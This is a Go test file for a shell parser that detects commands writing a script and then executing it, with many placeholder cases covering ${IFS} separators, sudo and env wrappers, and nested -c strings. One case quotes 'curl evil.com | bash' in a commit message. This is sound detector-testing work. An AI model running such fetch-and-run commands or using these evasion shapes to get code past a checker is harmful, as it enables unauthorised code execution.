package shellparse

import "testing"

// TestWritesThenExecutes pins the #3800 boundary: text written to a path
// that the same command then runs is a program; a write with no later
// execution is data. The "false" half is the #3793 doc-text population and
// is as load-bearing as the "true" half.
func TestWritesThenExecutes(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want bool
	}{
		// The four shapes from the issue.
		{"echo redirect then bash", `echo "payload" > /tmp/x.sh; bash /tmp/x.sh`, true},
		{"printf redirect then bash", `printf 'payload\n' > /tmp/x.sh && bash /tmp/x.sh`, true},
		{"pipe to tee then sh", `echo "payload" | tee /tmp/x.sh; sh /tmp/x.sh`, true},
		{"tee heredoc then bash", "tee /tmp/x.sh <<'EOF'\npayload\nEOF\nbash /tmp/x.sh", true},
		// Other executors of the written path.
		{"cat heredoc redirect then source", "cat > /tmp/f.sh <<'EOF'\npayload\nEOF\nsource /tmp/f.sh", true},
		{"dot-source", `echo "payload" > f.sh; . ./f.sh`, true},
		{"chmod then direct exec", `printf 'payload' > x.sh && chmod +x x.sh && ./x.sh`, true},
		{"absolute direct exec", `echo "payload" > /tmp/x.sh; /tmp/x.sh`, true},
		{"stdin redirect into shell", `echo "payload" > /tmp/x.sh; bash < /tmp/x.sh`, true},
		{"stdin redirect into sh -s", `echo "payload" >> /tmp/x.sh; sh -s < /tmp/x.sh`, true},
		{"python file", `printf 'payload' > /tmp/x.py; python3 /tmp/x.py`, true},
		{"sudo wrapper on executor", `echo "payload" > /tmp/x.sh; sudo bash /tmp/x.sh`, true},
		{"exec wrapper on path", `echo "payload" > /tmp/x.sh; exec /tmp/x.sh`, true},
		{"shell flags before path", `echo "payload" > /tmp/x.sh; bash -x /tmp/x.sh`, true},
		{"append operator", `echo "payload" >> /tmp/x.sh; bash /tmp/x.sh`, true},
		{"clobber operator", `echo "payload" >| /tmp/x.sh; bash /tmp/x.sh`, true},
		{"tee append", `echo "payload" | tee -a /tmp/x.sh; bash /tmp/x.sh`, true},
		{"reverse order still correlates", `bash /tmp/x.sh; echo "payload" > /tmp/x.sh`, true},
		{"inside a subshell", `(echo "payload" > /tmp/x.sh); bash /tmp/x.sh`, true},
		{"inside && chain", `echo "payload" > /tmp/x.sh && chmod +x /tmp/x.sh && bash /tmp/x.sh`, true},

		// Correlation on the normalised path.
		{"dot-slash write, bare exec operand", `echo "payload" > ./x.sh; bash x.sh`, true},
		{"bare write, dot-slash exec", `echo "payload" > x.sh; bash ./x.sh`, true},
		{"quoted write, unquoted exec", `echo "payload" > "/tmp/x.sh"; bash /tmp/x.sh`, true},
		{"same expansion on both sides", `echo "payload" > "$D/x.sh"; bash $D/x.sh`, true},
		{"double slash", `echo "payload" > /tmp//x.sh; bash /tmp/x.sh`, true},

		// A write with no execution keeps its label (#3793 population).
		{"heredoc to notes file", "cat > /tmp/notes.md <<'EOF'\npayload\nEOF", false},
		{"echo to notes file", `echo "payload" > /tmp/notes.txt`, false},
		{"tee to notes file", "tee /tmp/notes.txt <<'EOF'\npayload\nEOF", false},
		{"write then read back", `echo "payload" > /tmp/x.sh; cat /tmp/x.sh`, false},
		{"write then grep", `echo "payload" > /tmp/x.sh; grep -n payload /tmp/x.sh`, false},
		{"write then chmod only", `echo "payload" > /tmp/x.sh; chmod +x /tmp/x.sh`, false},
		{"write one, execute another", `echo "payload" > /tmp/x.sh; bash /tmp/y.sh`, false},
		{"write, execute a bare name (PATH lookup)", `echo "payload" > x.sh; x.sh`, false},
		{"different expansions", `echo "payload" > "$D/x.sh"; bash $E/x.sh`, false},
		{"tee stdout marker", `echo "payload" | tee -; bash -`, false},
		{"dev null", `echo "payload" > /dev/null; bash /dev/null`, false},
		{"commit message naming the shape", `git commit -m "docs: echo x > /tmp/x.sh; bash /tmp/x.sh is blocked"`, false},
		{"quoted shape in gh body", `gh issue create --title "FP" --body "rule fires on tee /tmp/x.sh; bash /tmp/x.sh"`, false},
		{"shell -c argument is a string, not a path", `echo "payload" > /tmp/x.sh; bash -c "cat /tmp/x.sh"`, false},
		{"plain command", `ls -la`, false},
		{"pipe only is the other function's job", `echo "payload" | bash`, false},

		// Codex review of #3800, pass 1: `source -- P` is accepted by bash.
		{"source with end-of-options", `echo "payload" > /tmp/x.sh; source -- /tmp/x.sh`, true},
		{"dot with end-of-options", `echo "payload" > /tmp/x.sh; . -- /tmp/x.sh`, true},
		// A shell's -c string is shell source and is walked.
		{"executor inside bash -c string", `echo "payload" > /tmp/x.sh; bash -c 'bash /tmp/x.sh'`, true},
		{"source inside sh -c string", `echo "payload" > /tmp/x.sh; sh -c '. /tmp/x.sh'`, true},
		{"nested -c strings", `echo "payload" > /tmp/x.sh; bash -c "sh -c 'bash /tmp/x.sh'"`, true},
		{"flag value before the path", `echo "payload" > /tmp/x.sh; bash -o pipefail /tmp/x.sh`, true},
		{"block redirect", `{ echo "payload"; } > /tmp/x.sh; bash /tmp/x.sh`, true},
		{"sudo -u wrapper", `echo "payload" > /tmp/x.sh; sudo -u nobody bash /tmp/x.sh`, true},
		// Accepted over-approximation, stated in the PR: a data file handed
		// to a script as argv is marked executed. It only withdraws an
		// excuse, so it fails closed; this case documents the shape rather
		// than endorsing it.
		{"data file as script argv (accepted FP shape)", `echo "payload" > /tmp/data.txt; python3 process.py /tmp/data.txt`, true},

		// Codex review of #3800, pass 1: an interpreter reading DATA is not
		// executing it. The #3797 per-executor flag semantics apply: -c for
		// everyone, -e / -m for code interpreters only.
		{"json.tool on stdin is a data read", `echo '{"k":"payload"}' > /tmp/n.json; python3 -m json.tool < /tmp/n.json`, false},
		{"json.tool operand is a data read", `echo '{"k":"payload"}' > /tmp/n.json; python3 -m json.tool /tmp/n.json`, false},
		{"node -e operand is argv", `echo "payload" > /tmp/n.txt; node -e 'process.exit(0)' /tmp/n.txt`, false},
		{"python -c operand is argv", `echo "payload" > /tmp/n.txt; python3 -c 'print(1)' /tmp/n.txt`, false},
		{"bash -c string that only reads", `echo "payload" > /tmp/x.sh; bash -c 'cat /tmp/x.sh'`, false},
		// Stated gap, shared with #3797's pipe path: `-m` is read as "the
		// program is a module", so a module that itself runs the file
		// (pdb, trace, cProfile) is not correlated.
		{"python -m pdb FILE is a stated gap", `echo "payload" > /tmp/x.py; python3 -m pdb /tmp/x.py`, false},
		// A shell's -e is errexit, not inline code (#3797).
		{"bash -e still runs the file", `echo "payload" > /tmp/x.sh; bash -e /tmp/x.sh`, true},

		// Codex review of #3800, pass 2: short options bundle, and `--`
		// ends option processing.
		{"bundled -ec is -e -c", `echo "payload" > /tmp/x.sh; bash -ec 'bash /tmp/x.sh'`, true},
		{"bundled -xeuc", `echo "payload" > /tmp/x.sh; bash -xeuc 'bash /tmp/x.sh'`, true},
		{"file literally named -c after end-of-options", `echo "payload" > -c; bash -- -c`, true},
		{"operands after -- are files", `echo "payload" > /tmp/x.sh; bash -x -- /tmp/x.sh`, true},
		// Pass 5 inverted these two: a code interpreter's inline-code flags
		// are exact tokens now, so a bundled -uc / -um over-records the
		// argv as candidate paths. That fails closed and is accepted; the
		// alternative (cluster matching) read `-Wignore` as a cluster with
		// e and failed open.
		{"python bundled -uc over-records (accepted)", `echo "payload" > /tmp/n.txt; python3 -uc 'print(1)' /tmp/n.txt`, true},
		{"python bundled -um over-records (accepted)", `echo '{"k":"payload"}' > /tmp/n.json; python3 -um json.tool /tmp/n.json`, true},
		{"lone dash is stdin, not an option cluster", `echo "payload" > /tmp/x.sh; bash - < /tmp/x.sh`, true},

		// Codex review of #3800, pass 3: a redirect on a later pipeline
		// stage is the same shape as `| tee P`.
		{"pipe into cat with redirect", `echo "payload" | cat > /tmp/x.sh; bash /tmp/x.sh`, true},
		{"pipe into middle stage with redirect", `echo "payload" | cat > /tmp/x.sh | true; bash /tmp/x.sh`, true},
		{"pipe into sudo tee", `echo "payload" | sudo tee /tmp/x.sh; bash /tmp/x.sh`, true},
		{"pipe into dd of=", `echo "payload" | dd of=/tmp/x.sh; bash /tmp/x.sh`, true},
		{"pipe into cat with redirect, no exec", `echo "payload" | cat > /tmp/notes.txt`, false},

		// Codex review of #3800, pass 4: the writer sits inside a compound
		// that is the pipe target.
		{"pipe into subshell cat redirect", `echo "payload" | (cat > /tmp/x.sh); bash /tmp/x.sh`, true},
		{"pipe into brace tee", `echo "payload" | { tee /tmp/x.sh; }; bash /tmp/x.sh`, true},
		{"pipe into brace cat redirect", `echo "payload" | { cat > /tmp/x.sh; }; bash /tmp/x.sh`, true},
		{"pipe into subshell tee", `echo "payload" | (tee /tmp/x.sh); bash /tmp/x.sh`, true},
		{"pipe into if body", `echo "payload" | if true; then cat > /tmp/x.sh; fi; bash /tmp/x.sh`, true},
		{"pipe into and-list", `echo "payload" | { true && cat > /tmp/x.sh; }; bash /tmp/x.sh`, true},
		// Codex review of #3800, pass 4: a generated script whose basename
		// is a recognised executor is still the file that was written.
		{"script named bash", "printf '#!/bin/sh\npayload\n' > /tmp/bash; chmod +x /tmp/bash; /tmp/bash", true},
		{"script named tee", `echo "payload" > /tmp/tee; chmod +x /tmp/tee; /tmp/tee`, true},
		{"script named sh under sudo", `echo "payload" > ./sh; sudo ./sh`, true},
		// Kai, #3800 review: `${D}` and `$D` are one unknown.
		{"dollar written, brace executed", `echo "payload" > $D/x.sh; bash ${D}/x.sh`, true},
		{"brace written, dollar executed", `echo "payload" > ${D}/x.sh; bash $D/x.sh`, true},
		{"quoted dollar vs brace", `echo "payload" > "$D/x.sh"; bash ${D}/x.sh`, true},
		{"brace with operator is a different value", `echo "payload" > ${D:-/tmp}/x.sh; bash $D/x.sh`, false},
		{"brace with prefix strip is a different value", `echo "payload" > ${D#/}/x.sh; bash $D/x.sh`, false},

		// Codex review of #3800, pass 5: an attached option VALUE is not a
		// cluster of inline-code flags (code interpreters match -c/-e/-m
		// as exact tokens only; shells keep cluster handling).
		{"python -Wignore is an option value", `echo "payload" > /tmp/x.py; python3 -Wignore /tmp/x.py`, true},
		{"perl -Mstrict is an option value", `echo "payload" > /tmp/x.pl; perl -Mstrict /tmp/x.pl`, true},
		{"python -uc over-records argv (accepted)", `echo "payload" > /tmp/x.py; python3 -uc 'print(1)' /tmp/x.py`, true},
		{"python exact -c still stops", `echo "payload" > /tmp/x.py; python3 -c 'print(1)' /tmp/x.py`, false},
		{"python exact -m still stops", `echo '{"k":"payload"}' > /tmp/n.json; python3 -m json.tool /tmp/n.json`, false},
		{"bash -ec still walked", `echo "payload" > /tmp/x.sh; bash -ec 'bash /tmp/x.sh'`, true},
		// Codex review of #3800, pass 5: redirect operators.
		{">& with a filename is a write", `echo "payload" >& /tmp/x.sh; bash /tmp/x.sh`, true},
		{">& with a descriptor is not", `echo "payload" >&2; bash /tmp/y.sh`, false},
		{">&- close is not a write", `echo "payload" >&-; bash /tmp/y.sh`, false},
		{"<> on an executor reads the file", `echo "payload" > /tmp/x.sh; bash <> /tmp/x.sh`, true},
		{"<> on a data reader is not execution", `echo "payload" > /tmp/n.txt; cat <> /tmp/n.txt`, false},
		// Codex review of #3800, pass 5: tee end-of-options.
		{"tee -- dash-named operand", `echo "payload" | tee -- -x.sh; bash ./-x.sh`, true},
		{"tee -- dash-named operand, no exec", `echo "payload" | tee -- -x.sh`, false},

		// CI parity gate (TestIFSSeparatorParity, second-space): an
		// unquoted ${IFS} glued to the operand is a word separator at
		// runtime, so the collector parses the IFS-normalised text.
		{"IFS glued to tee operand", "tee /tmp/x.sh${IFS}<<'EOF'\npayload\nEOF\nbash /tmp/x.sh", true},
		{"IFS glued to redirect word", "cat >${IFS}/tmp/f.sh <<'EOF'\npayload\nEOF\nsource /tmp/f.sh", true},
		{"IFS glued to executor on the execute side", `echo "payload" > /tmp/x.sh; bash${IFS}/tmp/x.sh`, true},
		{"IFS on both sides", `echo${IFS}"payload"${IFS}>${IFS}/tmp/x.sh;${IFS}bash${IFS}/tmp/x.sh`, true},
		{"quoted IFS is part of the path, not a separator", `echo "payload" > "/tmp/x${IFS}.sh"; bash /tmp/x.sh`, false},
		{"quoted IFS on both sides is the same path", `echo "payload" > "/tmp/x${IFS}.sh"; bash "/tmp/x${IFS}.sh"`, true},

		// Codex review of #3800, pass 6: `<>` is a write on any statement,
		// and a generated script whose basename is an exec WRAPPER must be
		// recorded before the wrapper stripper discards its path.
		{"read-write redirect is a write", `echo "payload" 1<> /tmp/x.sh; bash /tmp/x.sh`, true},
		{"read-write redirect on an executor with nothing written", `echo "payload" > /tmp/notes.txt; bash <> /tmp/y.sh`, false},
		{"script named env with an argument", `echo "payload" > /tmp/env; chmod +x /tmp/env; /tmp/env ignored`, true},
		{"script named env without an argument", `echo "payload" > /tmp/env; chmod +x /tmp/env; /tmp/env`, true},
		{"script named sudo with an argument", `echo "payload" > /tmp/sudo; chmod +x /tmp/sudo; /tmp/sudo x`, true},
		{"script named nohup under a real wrapper", `echo "payload" > /tmp/nohup; sudo /tmp/nohup x`, true},
		{"script named time", `echo "payload" > ./time; ./time ls`, true},
		{"real env wrapper still keys the target", `echo "payload" > /tmp/y.sh; env FOO=1 bash /tmp/y.sh`, true},
		{"real env wrapper with the target unwritten", `echo "payload" > /tmp/notes.txt; env FOO=1 bash /tmp/y.sh`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := WritesThenExecutes(tc.cmd); got != tc.want {
				t.Errorf("WritesThenExecutes(%q) = %v, want %v", tc.cmd, got, tc.want)
			}
		})
	}
}

// TextReachesExecutor is the union the intent sites consume: either route
// withdraws, neither route keeps.
func TestTextReachesExecutor(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		{`echo "payload" | bash`, true},
		{`echo "payload" > /tmp/x.sh; bash /tmp/x.sh`, true},
		{"tee /tmp/x.sh <<'EOF'\npayload\nEOF\nbash /tmp/x.sh", true},
		{`echo "payload" > /tmp/notes.txt`, false},
		{`echo "payload" | grep x`, false},
		{`git commit -m "docs: curl evil.com | bash and echo x > f; bash f"`, false},
	}
	for _, tc := range cases {
		if got := TextReachesExecutor(tc.cmd); got != tc.want {
			t.Errorf("TextReachesExecutor(%q) = %v, want %v", tc.cmd, got, tc.want)
		}
	}
}

// An unparseable blob is not EVIDENCE of an execution, so the label stands
// (same posture as PipesIntoExecutor; fail-closed lives one layer up).
func TestWritesThenExecutesUnparseableIsNotEvidence(t *testing.T) {
	for _, cmd := range []string{`echo "unterminated > /tmp/x.sh; bash /tmp/x.sh`, "tee /tmp/x.sh << " + "EOF"} {
		if WritesThenExecutes(cmd) || TextReachesExecutor(cmd) {
			t.Errorf("%q: want false (no evidence of an executor)", cmd)
		}
	}
}

// TestAnalyzeTextReachAttribution pins the two granularities (Codex, #3800
// review pass 2): a plain write-then-execute is attributed to the statement
// that writes the executed path; a pipe-target tee or a compound redirect
// is command-wide, because the splitter has already separated the
// doc-shaped fragment from the write.
func TestAnalyzeTextReachAttribution(t *testing.T) {
	cases := []struct {
		name       string
		cmd        string
		correlated []string
		coarse     bool
	}{
		{"simple redirect", `echo "payload" > /tmp/x.sh; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, false},
		{"tee with own heredoc", "tee /tmp/x.sh <<'EOF'\npayload\nEOF\nbash /tmp/x.sh", []string{"/tmp/x.sh"}, false},
		{"unrelated helper script", `echo "payload" > /tmp/notes.txt; echo true > /tmp/check.sh; bash /tmp/check.sh`, []string{"/tmp/check.sh"}, false},
		{"pipe-target tee is coarse", `echo "payload" | tee /tmp/x.sh; sh /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"pipe-target cat redirect is coarse", `echo "payload" | cat > /tmp/x.sh; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"middle-stage redirect is coarse", `echo "payload" | cat > /tmp/x.sh | true; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"pipe-target dd is coarse", `echo "payload" | dd of=/tmp/x.sh; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"first stage redirect stays attributable", `echo "payload" > /tmp/x.sh | true; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, false},
		{"subshell pipe target is coarse", `echo "payload" | (cat > /tmp/x.sh); bash /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"brace pipe target is coarse", `echo "payload" | { tee /tmp/x.sh; }; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"brace-folded key", `echo "payload" > $D/x.sh; bash ${D}/x.sh`, []string{"$D/x.sh"}, false},
		{"tee -- with own heredoc is attributable", "tee -- -x.sh <<'EOF'\npayload\nEOF\nbash ./-x.sh", []string{"-x.sh"}, false},
		{"tee -- as pipe target is coarse", `echo "payload" | tee -- -x.sh; bash ./-x.sh`, []string{"-x.sh"}, true},
		{">& filename is attributable", `echo "payload" >& /tmp/x.sh; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, false},
		{"<> on a plain statement is attributable", `echo "payload" 1<> /tmp/x.sh; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, false},
		{"wrapper-named script correlates", `echo "payload" > /tmp/env; /tmp/env ignored`, []string{"/tmp/env"}, false},
		{"compound redirect is coarse", `{ echo "payload"; } > /tmp/x.sh; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"write inside -c string is coarse", `bash -c 'echo payload > /tmp/x.sh'; bash /tmp/x.sh`, []string{"/tmp/x.sh"}, true},
		{"no execution", `echo "payload" > /tmp/notes.txt`, nil, false},

		// #3814, one level of indirection: the executed script's own text
		// sources a second written path, so that path's writer has handed
		// its text to an executor too. Measured on main: only run.sh
		// correlated, and the payload statement kept its label.
		{"generated runner sources the lib", `echo "payload" > /tmp/lib.sh; echo '. /tmp/lib.sh' > /tmp/run.sh; bash /tmp/run.sh`, []string{"/tmp/run.sh", "/tmp/lib.sh"}, false},
		{"generated runner runs the lib via bash", `echo "payload" > /tmp/lib.sh; echo 'bash /tmp/lib.sh' > /tmp/run.sh; sh /tmp/run.sh`, []string{"/tmp/run.sh", "/tmp/lib.sh"}, false},
		{"printf runner", `echo "payload" > /tmp/lib.sh; printf 'source /tmp/lib.sh\n' > /tmp/run.sh; bash /tmp/run.sh`, []string{"/tmp/run.sh", "/tmp/lib.sh"}, false},
		{"heredoc runner", "echo \"payload\" > /tmp/lib.sh; cat > /tmp/run.sh <<'EOF'\n. /tmp/lib.sh\nEOF\nbash /tmp/run.sh", []string{"/tmp/run.sh", "/tmp/lib.sh"}, false},
		{"tee heredoc runner", "echo \"payload\" > /tmp/lib.sh; tee /tmp/run.sh <<'EOF'\nsource /tmp/lib.sh\nEOF\nbash /tmp/run.sh", []string{"/tmp/run.sh", "/tmp/lib.sh"}, false},
		{"sudo tee heredoc runner", "echo \"payload\" > /tmp/lib.sh; sudo tee /tmp/run.sh <<'EOF'\n. /tmp/lib.sh\nEOF\nsudo bash /tmp/run.sh", []string{"/tmp/run.sh", "/tmp/lib.sh"}, false},
		{"two hops", `echo "payload" > /tmp/a.sh; echo '. /tmp/a.sh' > /tmp/b.sh; echo 'bash /tmp/b.sh' > /tmp/c.sh; bash /tmp/c.sh`, []string{"/tmp/c.sh", "/tmp/b.sh", "/tmp/a.sh"}, false},
		{"runner that only reads the lib", `echo "payload" > /tmp/lib.sh; echo 'cat /tmp/lib.sh' > /tmp/run.sh; bash /tmp/run.sh`, []string{"/tmp/run.sh"}, false},
		{"runner content is not static", `echo "payload" > /tmp/lib.sh; echo "$X" > /tmp/run.sh; bash /tmp/run.sh`, []string{"/tmp/run.sh"}, false},
		{"runner names a lib nobody wrote", `echo "payload" > /tmp/notes.txt; echo '. /tmp/lib.sh' > /tmp/run.sh; bash /tmp/run.sh`, []string{"/tmp/run.sh"}, false},
		// The generated script's own write is the script's, not a labelled
		// statement's: it neither correlates nor makes the command coarse.
		{"runner that writes and runs its own script", `echo "payload" > /tmp/notes.txt; echo 'echo hi > /tmp/x.sh; bash /tmp/x.sh' > /tmp/run.sh; bash /tmp/run.sh`, []string{"/tmp/run.sh"}, false},
		{"lib written but runner never executed", `echo "payload" > /tmp/lib.sh; echo '. /tmp/lib.sh' > /tmp/run.sh`, nil, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := AnalyzeTextReach(tc.cmd)
			if len(r.Correlated) != len(tc.correlated) {
				t.Fatalf("Correlated = %v, want %v", r.Correlated, tc.correlated)
			}
			for _, p := range tc.correlated {
				if !r.Correlated[p] {
					t.Errorf("Correlated missing %q: %v", p, r.Correlated)
				}
			}
			if r.CoarseCorrelated != tc.coarse {
				t.Errorf("CoarseCorrelated = %v, want %v", r.CoarseCorrelated, tc.coarse)
			}
		})
	}
}

// TestStatementWritesAny is the per-statement half: the statement that
// writes the executed path loses its label; its neighbours keep theirs.
func TestStatementWritesAny(t *testing.T) {
	paths := map[string]bool{"/tmp/check.sh": true}
	cases := []struct {
		stmt string
		want bool
	}{
		{`echo "payload" > /tmp/notes.txt`, false},
		{`echo true > /tmp/check.sh`, true},
		{`echo true > /tmp/../tmp//check.sh`, true},
		{`echo true > ./tmp/check.sh`, false}, // relative vs absolute is not resolved, by design
		{`bash /tmp/check.sh`, false},
		{"tee /tmp/check.sh <<'EOF'\ntrue\nEOF", true},
		{`tee -a /tmp/check.sh`, true},
		{`bash -c 'echo true > /tmp/check.sh'`, true},
		{`cat /tmp/check.sh`, false},
		{`git commit -m "docs: echo x > /tmp/check.sh"`, false},
		{`echo true >& /tmp/check.sh`, true},
		{`echo true >&2`, false},
		{"echo true >${IFS}/tmp/check.sh", true},
		{`echo true 1<> /tmp/check.sh`, true},
		{"tee /tmp/check.sh${IFS}<<'EOF'\ntrue\nEOF", true},
	}
	for _, tc := range cases {
		if got := StatementWritesAny(tc.stmt, paths); got != tc.want {
			t.Errorf("StatementWritesAny(%q) = %v, want %v", tc.stmt, got, tc.want)
		}
	}
	if StatementWritesAny(`echo true > /tmp/check.sh`, nil) {
		t.Error("nil paths must never match")
	}
}
